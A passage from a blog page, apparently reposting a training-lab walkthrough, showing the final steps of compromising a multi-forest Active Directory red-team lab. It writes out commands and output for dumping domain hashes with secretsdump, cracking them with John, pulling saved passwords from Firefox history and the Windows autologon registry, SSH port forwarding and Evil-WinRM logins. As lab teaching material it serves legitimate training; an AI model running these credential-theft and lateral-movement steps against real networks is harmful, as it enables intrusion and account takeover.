<figure class="highlight dts"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dts">𝑛𝑠𝑙𝑜𝑜𝑘𝑢𝑝 𝑗𝑢𝑚𝑝−𝑠𝑟𝑣<br><br><span class="hljs-params">&lt;..SNIP..&gt;</span><br><span class="hljs-symbol">Name:</span> jump-srv.mgmt.corp<br>IP Address: <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span><br><span class="hljs-params">&lt;../SNIP..&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>However, we will extract all the credentials present in the MGMT.CORP domain leveraging impacket’s <strong><em>sercretsdump.py</em></strong> script.</p>
<p>On a new bash prompt using our route to internal network [10.10.3.0/24], we will execute secretsdump.py as follows:</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs asciidoc">𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑠𝑒𝑐𝑟𝑒𝑡𝑠𝑑𝑢𝑚𝑝. 𝑝𝑦 −𝑑𝑒𝑏𝑢𝑔 −𝑑𝑐−𝑖𝑝 10.10.3.2 𝑠𝑝𝑛_𝑠𝑣𝑐@𝑀𝐺𝑀𝑇−𝐷𝐶.𝑀𝐺𝑀𝑇.𝐶𝑂𝑅𝑃<br><br><span class="hljs-meta">[..SNIP..]</span><br><span class="hljs-bullet">𝒎𝒈𝒎𝒕−𝒂𝒅𝒎𝒊𝒏:500:𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:86𝑐64𝑎256𝑒8𝑎𝑒𝑏2𝑒𝑑𝑓31𝑏4157𝑏𝑓6𝑏𝑒𝑐𝑏:::</span><br><span class="hljs-bullet"></span><span class="hljs-bullet">𝒌𝒓𝒃𝒕𝒈𝒕:502:𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:2𝑎7𝑎0𝑓537983𝑏𝑎𝑐4120725𝑑055𝑓𝑐𝑏𝑏𝑎9:::</span><br><span class="hljs-bullet"></span><span class="hljs-bullet">𝒎𝒈𝒎𝒕.𝒄𝒐𝒓𝒑\𝒋𝒖𝒎𝒑−𝒂𝒅𝒎𝒊𝒏:1104:𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:𝟐𝒅𝒄𝟗𝒃𝒇𝒇𝟑𝟗𝟕𝒇𝟗𝒆𝟔𝒄𝟗𝒇𝟎𝟖𝒂𝟎𝟓𝒃𝟏𝟖𝟏𝟒𝟓𝒂𝟕𝒃𝟔:::</span><br><span class="hljs-bullet"></span><span class="hljs-bullet">𝒎𝒈𝒎𝒕.𝒄𝒐𝒓𝒑\𝒔𝒑𝒏_𝒔𝒗𝒄:1106:𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒𝑎𝑎𝑑3𝑏435𝑏51404𝑒𝑒:2𝑑𝑐9𝑏𝑓𝑓397𝑓9𝑒6𝑐9𝑓08𝑎05𝑏18145𝑎7𝑏6:::</span><br><span class="hljs-bullet"></span><span class="hljs-meta">[..SNIP..]</span><br></code></pre></div></td></tr></table></figure>

<p>Crack the “<strong>jump-admin</strong>“ hash using JTR [John] by storing the NT hash in a file.</p>
<figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">→ Crack jump-admin hash(<span class="hljs-number">2</span>dc9bff397f9e6c9f08a05b18145a7b6):<br><br><span class="hljs-keyword">Copy</span> the hash “<span class="hljs-number">2</span>dc9bff397f9e6c9f08a05b18145a7b6” in jump-adminpass.txt <span class="hljs-keyword">file</span><br><br>𝑗𝑜ℎ𝑛 −−𝑓𝑜𝑟𝑚𝑎𝑡=𝑁𝑇 𝑗𝑢𝑚𝑝−𝑎𝑑𝑚𝑖𝑛𝑝𝑎𝑠𝑠.𝑡𝑥𝑡 −𝑤=<span class="hljs-regexp">/𝑢𝑠𝑟/</span>𝑠ℎ𝑎𝑟𝑒<span class="hljs-regexp">/𝑤𝑜𝑟𝑑𝑙𝑖𝑠𝑡𝑠/</span>𝑟𝑜𝑐𝑘𝑦𝑜𝑢.𝑡𝑥𝑡<br></code></pre></div></td></tr></table></figure>

<p>The hash is cracked and we now have clear text credentials of the “<strong>jump-admin</strong>“ user at the <strong>“Jump-Admin”</strong> machine.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image41.png" srcset="/img/loading.gif"></p>
<ol>
<li> <strong>Jump-Srv</strong></li>
</ol>
<p>Let’s perform a TCP port scan against the target 10.10.3.3 [<strong>jump-srv.mgmt.corp</strong>] using nmap and leveraging the route to the 10.10.3.0/24 network.</p>
<figure class="highlight pf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pf">With meterpreter active <span class="hljs-keyword">route</span> <span class="hljs-keyword">to</span> “<span class="hljs-number">10.10</span>.<span class="hljs-number">3.0</span>/<span class="hljs-number">24</span>” network &amp; <span class="hljs-keyword">on</span> new bash shell<br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑛𝑚𝑎𝑝 −−𝑡𝑜𝑝−𝑝𝑜𝑟𝑡𝑠 <span class="hljs-number">10</span> −𝑠𝑇 −𝑠𝑉 −𝑃𝑛 <span class="hljs-number">10.10</span>.<span class="hljs-number">3.3</span><br><br><span class="hljs-variable">&lt;..SNIP..&gt;</span><br>𝑁𝑚𝑎𝑝 𝑠𝑐𝑎𝑛 𝑟𝑒𝑝𝑜𝑟𝑡 𝑓𝑜𝑟 <span class="hljs-number">10.10</span>.<span class="hljs-number">3.3</span><br>𝐻𝑜𝑠𝑡 𝑖𝑠 𝑢𝑝 (<span class="hljs-number">2.4</span>𝑠 𝑙𝑎𝑡𝑒𝑛𝑐𝑦).<br>𝑃𝑂𝑅𝑇 𝑆𝑇𝐴𝑇𝐸 𝑆𝐸𝑅𝑉𝐼𝐶𝐸 𝑉𝐸𝑅𝑆𝐼𝑂𝑁<br><span class="hljs-number">21</span>/𝑡𝑐𝑝 𝑐𝑙𝑜𝑠𝑒𝑑 𝑓𝑡𝑝<br>𝟐𝟐/𝒕𝒄𝒑 𝒐𝒑𝒆𝒏 𝒔𝒔𝒉 𝑶𝒑𝒆𝒏𝑺𝑺𝑯 𝟕.𝟐𝒑𝟐 𝑼𝒃𝒖𝒏𝒕𝒖 𝟒𝒖𝒃𝒖𝒏𝒕𝒖𝟐.𝟖 (𝑼𝒃𝒖𝒏𝒕𝒖 𝑳𝒊𝒏𝒖𝒙;𝒑𝒓𝒐𝒕𝒐𝒄𝒐𝒍 𝟐.𝟎)<br><span class="hljs-number">23</span>/𝑡𝑐𝑝 𝑐𝑙𝑜𝑠𝑒𝑑 𝑡𝑒𝑙𝑛𝑒𝑡<br><span class="hljs-number">25</span>/𝑡𝑐𝑝 𝑐𝑙𝑜𝑠𝑒𝑑 𝑠𝑚𝑡𝑝<br><span class="hljs-number">80</span>/𝑡𝑐𝑝 𝑐𝑙𝑜𝑠𝑒𝑑 ℎ𝑡𝑡𝑝<br><span class="hljs-number">110</span>/𝑡𝑐𝑝 𝑐𝑙𝑜𝑠𝑒𝑑 𝑝𝑜𝑝<span class="hljs-number">3</span><br><span class="hljs-variable">&lt;..SNIP..&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>SSH server is running on TCP port 22. As ‘<strong>jump-srv.mgmt.corp</strong>‘ machine is managed by “<strong>jump-admin</strong>“, we can try to do SSH to ‘<strong>10.10.3.3</strong>‘ machine using Jump-Admin Domain user.</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">Perform</span> SSH <span class="hljs-keyword">to</span> <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span> <span class="hljs-keyword">as</span> jump-<span class="hljs-keyword">admin</span> <span class="hljs-keyword">domain</span> <span class="hljs-keyword">user</span>.<br><br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑠𝑠ℎ −𝑙 𝑗𝑢𝑚𝑝−𝑎𝑑𝑚𝑖𝑛@𝑀𝐺𝑀𝑇.𝐶𝑂𝑅𝑃 <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span><br>NOTE: enter jump-<span class="hljs-keyword">admin</span> cracked <span class="hljs-keyword">password</span> ‘B@DB!tch’<br></code></pre></div></td></tr></table></figure>

<p>We successfully SSHed to Jump-SRV.mgmt.corp as the “<strong>jump-admin</strong>“ domain user.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image42.png" srcset="/img/loading.gif"></p>
<p>Let’s also extract the bookmark URLs of Firefox in this machine and look if any interesting information can</p>
<p>be found (as jump-admin user).</p>
<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">As ‘Jump-admin’ domain user<br>𝑐𝑑 <span class="hljs-regexp">/.𝑚𝑜𝑧𝑖𝑙𝑙𝑎/</span>𝑓𝑖𝑟𝑒𝑓𝑜𝑥/<span class="hljs-number">2</span>𝑠<span class="hljs-number">3</span>𝑝<span class="hljs-number">6</span>𝑚<span class="hljs-number">1</span>𝑣.𝑑𝑒𝑓𝑎𝑢𝑙𝑡−𝑟𝑒𝑙𝑒𝑎𝑠𝑒<br>𝑠𝑞𝑙𝑖𝑡𝑒<span class="hljs-number">3</span> 𝑝𝑙𝑎𝑐𝑒𝑠.𝑠𝑞𝑙𝑖𝑡𝑒<br><br>Inside SQLite<br>.𝑡𝑎𝑏𝑙𝑒𝑠<br>𝑠𝑒𝑙𝑒𝑐𝑡 𝑚𝑜𝑧_𝑝𝑙𝑎𝑐𝑒𝑠.𝑢𝑟𝑙 𝑓𝑟𝑜𝑚 𝑚𝑜𝑧_𝑝𝑙𝑎𝑐𝑒𝑠;<br>.𝑞𝑢𝑖𝑡<br><br>𝑓𝑜𝑢𝑛𝑑 𝑈𝑅𝐿: 𝒉𝒕𝒕𝒑𝒔:<span class="hljs-regexp">//</span>𝒂𝒅𝒎𝒊𝒏−𝒔𝒚𝒔.𝒔𝒊𝒕𝒆/𝒍𝒐𝒈𝒊𝒏.𝒂𝒔𝒑?𝒖𝒔𝒆𝒓=𝒔𝒚𝒔−𝒂𝒅𝒎𝒊𝒏&amp;𝒑𝒂𝒔𝒔=𝑹𝒂𝒏𝒅𝟎𝒎𝒍𝒚𝑺𝟑𝒍𝟑𝒄𝒕𝒆𝒅𝑷@𝒔𝒔<br></code></pre></div></td></tr></table></figure>

<p>However, using firefox with proxychains querying the login URL, shows that it is non-existent, Now enumerate the IP address of <strong>admin-sys</strong> server by pinging the URL.</p>
<figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css">𝑝𝑖𝑛𝑔 𝑎𝑑𝑚𝑖𝑛−𝑠𝑦𝑠.𝑠𝑖𝑡𝑒<br>Discovered IP <span class="hljs-selector-tag">address</span> <span class="hljs-selector-attr">[192.168.1.2]</span><br></code></pre></div></td></tr></table></figure>

<p>Performing TCP port scan on the target “<strong>192.168.1.2</strong>“ reveals that the 5985 port is open, which means one can always do PowerShell Remoting.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image43.png" srcset="/img/loading.gif"></p>
<ol>
<li> <strong>Admin-SYS</strong></li>
</ol>
<p>In order to perform PowerShell Remoting, we need to apply some port forwarding techniques.</p>
<p>Exit the SSH session and re-establish a new session with port forwarding switches.</p>
<p>Using port forwarding, we are specifying that all the traffic sent locally will be forwarded to the ‘<strong>admin-sys</strong>‘ server [192.168.1.2]</p>
<figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">On</span> a <span class="hljs-built_in">new</span> bash <span class="hljs-keyword">session</span><br>𝑝𝑟𝑜𝑥𝑦𝑐ℎ𝑎𝑖𝑛𝑠 𝑠𝑠ℎ −𝑙 𝑗𝑢𝑚𝑝−𝑎𝑑𝑚𝑖𝑛@𝑀𝐺𝑀𝑇.𝐶𝑂𝑅𝑃 <span class="hljs-number">10.10</span><span class="hljs-number">.3</span><span class="hljs-number">.3</span> −𝐿 <span class="hljs-number">5985</span>:<span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span>:<span class="hljs-number">5985</span><br>(Now at this very particular <span class="hljs-type">point</span>, traffic <span class="hljs-keyword">from</span> your attacker machine can reach the <span class="hljs-keyword">admin</span>-sys machine)<br><br>Use Evil-WinRM <span class="hljs-keyword">to</span> <span class="hljs-keyword">connect</span> <span class="hljs-keyword">to</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.2</span> machine <span class="hljs-keyword">with</span> the discovered credentials<br>./𝑒𝑣𝑖𝑙−𝑤𝑖𝑛𝑟𝑚.𝑟𝑏 −𝑖 <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> −𝑢 𝑠𝑦𝑠−𝑎𝑑𝑚𝑖𝑛 −𝑝 𝑅𝑎𝑛𝑑<span class="hljs-number">0</span>𝑚𝑙𝑦𝑆<span class="hljs-number">3</span>𝑙<span class="hljs-number">3</span>𝑐𝑡𝑒𝑑𝑃@𝑠𝑠<br></code></pre></div></td></tr></table></figure>

<p>Enumerating the environment reveals that “<strong>sys-admin”</strong> is a local user at the admin-sys server. Privilege escalation can be done by querying the autologin registry.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image44.png" srcset="/img/loading.gif"></p>
<p>Clear Text credentials of Administrator are found.</p>
<figure class="highlight haxe"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs haxe">On the recently established WinRM session<br>𝑟𝑒𝑔 𝑞𝑢𝑒𝑟𝑦 <span class="hljs-string">&quot;𝐻𝐾𝐿𝑀\𝑆𝑂𝐹𝑇𝑊𝐴𝑅𝐸\𝑀𝑖𝑐𝑟𝑜𝑠𝑜𝑓𝑡\𝑊𝑖𝑛𝑑𝑜𝑤𝑠 𝑁𝑇\𝐶𝑢𝑟𝑟𝑒𝑛𝑡𝑣𝑒𝑟𝑠𝑖𝑜𝑛\𝑊𝑖𝑛𝑙𝑜𝑔𝑜𝑛&quot;</span><br><br>&lt;..SNIP..&gt;<br>𝐻𝐾𝐸𝑌<span class="hljs-literal">_</span>𝐿𝑂𝐶𝐴𝐿<span class="hljs-literal">_</span>𝑀𝐴𝐶𝐻𝐼𝑁𝐸\𝑆𝑂𝐹𝑇𝑊𝐴𝑅𝐸\𝑀𝑖𝑐𝑟𝑜𝑠𝑜𝑓𝑡\𝑊𝑖𝑛𝑑𝑜𝑤𝑠 𝑁𝑇\𝐶𝑢𝑟𝑟𝑒𝑛𝑡𝑣𝑒𝑟𝑠𝑖𝑜𝑛\𝑊𝑖𝑛𝑙𝑜𝑔𝑜𝑛<br>𝐴𝑢𝑡𝑜𝑅𝑒𝑠𝑡𝑎𝑟𝑡𝑆ℎ𝑒𝑙𝑙 𝑅𝐸𝐺<span class="hljs-literal">_</span>𝐷𝑊𝑂𝑅𝐷 <span class="hljs-number">0</span>𝑥<span class="hljs-number">1</span><br>𝐵𝑎𝑐𝑘𝑔𝑟𝑜𝑢𝑛𝑑 𝑅𝐸𝐺<span class="hljs-literal">_</span>𝑆𝑍 <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span><br>𝐶𝑎𝑐ℎ𝑒𝑑𝐿𝑜𝑔𝑜𝑛𝑠𝐶𝑜𝑢𝑛𝑡 𝑅𝐸𝐺<span class="hljs-literal">_</span>𝑆𝑍 <span class="hljs-number">10</span><br>𝐷𝑒𝑏𝑢𝑔𝑆𝑒𝑟𝑣𝑒𝑟𝐶𝑜𝑚𝑚𝑎𝑛𝑑 𝑅𝐸𝐺<span class="hljs-literal">_</span>𝑆𝑍 𝑛𝑜<br>𝐷𝑒𝑓𝑎𝑢𝑙𝑡𝑈𝑠𝑒𝑟𝑁𝑎𝑚𝑒 𝑅𝐸𝐺<span class="hljs-literal">_</span>𝑆𝑍 𝑨𝒅𝒎𝒊𝒏𝒊𝒔𝒕𝒓𝒂𝒕𝒐𝒓<br>𝐷𝑒𝑓𝑎𝑢𝑙𝑡𝐷𝑜𝑚𝑎𝑖𝑛𝑁𝑎𝑚𝑒 𝑅𝐸𝐺<span class="hljs-literal">_</span>𝑆𝑍 𝑊𝐼𝑁−<span class="hljs-number">10</span>−𝑃𝑅𝑂−𝑋<span class="hljs-number">64</span><br>𝐴𝑢𝑡𝑜𝐴𝑑𝑚𝑖𝑛𝐿𝑜𝑔𝑜𝑛 𝑅𝐸𝐺<span class="hljs-literal">_</span>𝑆𝑍 <span class="hljs-number">1</span><br>𝐷𝑒𝑓𝑎𝑢𝑙𝑡𝑃𝑎𝑠𝑠𝑤𝑜𝑟𝑑 𝑅𝐸𝐺<span class="hljs-literal">_</span>𝑆𝑍 𝑻𝒆𝒔𝒕@𝟏𝟐𝟑<br>&lt;..SNIP..&gt;<br></code></pre></div></td></tr></table></figure>

<p>Reconnect to the ‘<strong>admin-sys’</strong> server with local administrator credentials.</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs taggerscript">./𝑒𝑣𝑖𝑙−𝑤𝑖𝑛𝑟𝑚.𝑟𝑏 −𝑖 127.0.0.1 −𝑢 𝐴𝑑𝑚𝑖𝑛𝑖𝑠𝑡𝑟𝑎𝑡𝑜𝑟 −𝑝 𝑇𝑒𝑠𝑡@123<br>𝑡𝑦𝑝𝑒 𝐶:<span class="hljs-symbol">\</span>𝑈𝑠𝑒𝑟𝑠<span class="hljs-symbol">\</span>𝐴𝑑𝑚𝑖𝑛𝑖𝑠𝑡𝑟𝑎𝑡𝑜𝑟<span class="hljs-symbol">\</span>𝐷𝑒𝑠𝑘𝑡𝑜𝑝<span class="hljs-symbol">\</span>𝑇𝑟𝑖𝑢𝑚𝑝ℎ.𝑡𝑥𝑡<br><br>&lt;Result&gt;<br>CONGRATULATIONS, YOU HAVE SUCCESSFULLY COMPROMISED MULTI-FOREST RED TEAM ENVIRONMENT!!<br>&lt;3<br>&lt;/Result&gt;<br></code></pre></div></td></tr></table></figure>

<p>Congratulations!!</p>
<p>The Multi-Forest Red Team Environment is successfully compromised.</p>
<p><img src="https://assets.ine.com/cybersecurity-lab-images/57ee8694-facd-4535-b6c8-b4595d18ecb7/image45.png" srcset="/img/loading.gif"></p>

            </div>
            <hr>
            <div>
              <div class="post-metas mb-3">
                
                
                  <div class="post-meta">
                    <i class="iconfont icon-tags"></i>
                    
                      <a class="hover-with-bg" href="/tags/killchains/">killchains</a>
                    
                  </div>
                
              </div>
              
                
              
              
                <div class="post-prevnext">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2021/06/22/%E6%94%BB%E5%87%BB%E9%93%BE%E5%85%AD%EF%BC%9A%E5%9F%9F%E6%B8%97%E9%80%8F%E6%A1%88%E4%BE%8B%E4%B8%89/">
                        <span class="hidden-mobile">攻击链六：域渗透案例三</span>
                        <span class="visible-mobile">Next</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>
    
      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
        <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
  <div class="toc-body" id="toc-body"></div>
</div>

      </div>
    
  </div>
</div>

<!-- Custom -->


            

                
                  <a id="scroll-top-button" href="#" role="button">
                    <i class="iconfont icon-arrowup" aria-hidden="true"></i>
                  </a>
                  

                    
                      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v"
                 for="local-search-input">keyword</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>
                        

                          
      </main>

      <footer class="text-center mt-5 py-3">
  <div class="footer-content">
     <a href="https://whale3070.github.io/" target="_blank" rel="nofollow noopener"><span>Whale3070</span></a> 
  </div>
  
  <div class="statistics">
    
    

    
      
        <!-- 不蒜子统计PV -->
        <span id="busuanzi_container_site_pv" style="display: none">
            总访问量 
            <span id="busuanzi_value_site_pv"></span>
             次
          </span>
      
      
        <!-- 不蒜子统计UV -->
        <span id="busuanzi_container_site_uv" style="display: none">
            总访客数 
            <span id="busuanzi_value_site_uv"></span>
             人
          </span>
      
    
  </div>


  

  
</footer>

<!-- SCRIPTS -->

  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
<script  src="/js/debouncer.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>

<!-- Plugins -->


  
    <script  src="/js/lazyload.js" ></script>
  



  



  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>



  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>



  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>



  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>






  <script  src="/js/local-search.js" ></script>
  <script>
    (function () {
      var path = "/local-search.xml";
      var inputArea = document.querySelector("#local-search-input");
      inputArea.onclick = function () {
        searchFunc(path, 'local-search-input', 'local-search-result');
        this.onclick = null
      }
    })()
  </script>















<!-- 主题的启动项 保持在最底部 -->
<script  src="/js/boot.js" ></script>



    </body>

  </html>